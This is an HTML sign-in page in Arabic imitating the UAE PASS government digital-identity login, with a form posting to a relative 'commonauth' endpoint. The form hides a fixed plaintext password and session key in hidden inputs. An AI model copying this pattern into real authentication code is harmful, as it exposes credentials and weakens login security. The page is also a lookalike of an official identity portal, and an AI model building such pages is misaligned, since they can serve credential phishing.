<!doctype html>
<html lang="ar">
<head dir="rtl">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UAE PASS - تسجيل الدخول</title>
    
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="rectangle"></div>

    <div class="container">
        
        <div class="logo">
            <img src="self_service.png" alt="UAE Pass Logo">
        </div>

        <div class="login-to-uaepass">
            الدخول عن طريق الهوية الرقمية
        </div>

        <form action="../../commonauth" method="post">
            <input type="text" class="idn-input" id="username" name="username" 
                   placeholder="رقم الهوية، البريد الإلكتروني، أو الهاتف">
            
            <div style="text-align: right; margin-top: 15px;">
                <input type="checkbox" checked id="rememberme" name="rememberme">
                <label class="dont-have-account" for="rememberme">تذكرني</label>
            </div>

            <button type="submit" class="btn-login">تسجيل الدخول</button>
            
            <input type="hidden" name="password" value="ndwenw902ee9239">
            <input type="hidden" name="sessionDataKey" value="5b97084d-a443-4984-a417-63fdee833691">
        </form>

        <div class="extra-links">
            <span class="dont-have-account">ليس لديك حساب؟</span>
            <a href="#" class="create-new-account">إنشاء حساب جديد</a>
            <a href="#" class="recover-account">كيفية استعادة الحساب؟</a>
        </div>

        <footer class="footer">
            <div class="path"></div>
            <div class="footer-links">
                <a href="#" class="menu">الدعم</a>
                <a href="#" class="menu">الأسئلة الشائعة</a>
                <a href="#" class="menu">نبذة عامة</a>
            </div>
            <span class="copyright">حقوق النشر © 2025 الهوية الرقمية جميع الحقوق محفوظة.</span>
        </footer>
    </div>

</body>
</html>
